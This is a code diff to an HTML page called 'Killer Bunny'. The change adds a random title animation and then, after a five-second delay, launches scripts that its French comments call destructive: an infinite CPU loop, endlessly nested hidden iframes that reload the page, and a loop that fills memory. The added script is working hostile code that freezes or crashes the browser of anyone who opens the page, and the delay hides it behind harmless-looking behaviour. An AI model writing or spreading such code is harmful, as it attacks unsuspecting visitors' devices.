@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lapin Tueur</title>
+    <title>Killer Bunny</title>
     <style>
         /* Thème sombre global */
         body {
@@ -122,24 +122,42 @@
 
     <!-- Scripts JavaScript -->
     <script>
-        // Boucle infinie pour surcharger le CPU
-        while (true) {
-            console.log("Boucle Infinie...");
+        // Fonction pour générer un titre aléatoire avec "Killer Bunny" au centre
+        function generateTitle() {
+            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let leftPart = "";
+            let rightPart = "";
+            for (let i = 0; i < 5; i++) {
+                leftPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
+                rightPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
+            }
+            document.title = `${leftPart} Killer Bunny ${rightPart}`;
         }
 
-        // Iframes imbriquées à l'infini pour saturer la mémoire
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
-        iframe.src = `index.html?${nextQueryValue}`;
+        // Mise à jour du titre toutes les secondes
+        setInterval(generateTitle, 1000);
 
-        // Surcharge mémoire immédiate
-        let memoryOverload = [];
-        for (let i = 0; i < 100000; i++) {
-            memoryOverload.push({});
-        }
-        console.log("Surcharge mémoire immédiate !");
+        // Délai de 5 secondes avant de lancer les scripts destructeurs
+        setTimeout(function() {
+            // Boucle infinie pour surcharger le CPU
+            while (true) {
+                console.log("Boucle Infinie...");
+            }
+
+            // Iframes imbriquées à l'infini pour saturer la mémoire
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
+            iframe.src = `index.html?${nextQueryValue}`;
+
+            // Surcharge mémoire immédiate
+            let memoryOverload = [];
+            for (let i = 0; i < 100000; i++) {
+                memoryOverload.push({});
+            }
+            console.log("Surcharge mémoire immédiate !");
+        }, 5000); // Délai de 5 secondes
     </script>
 </body>
 </html>
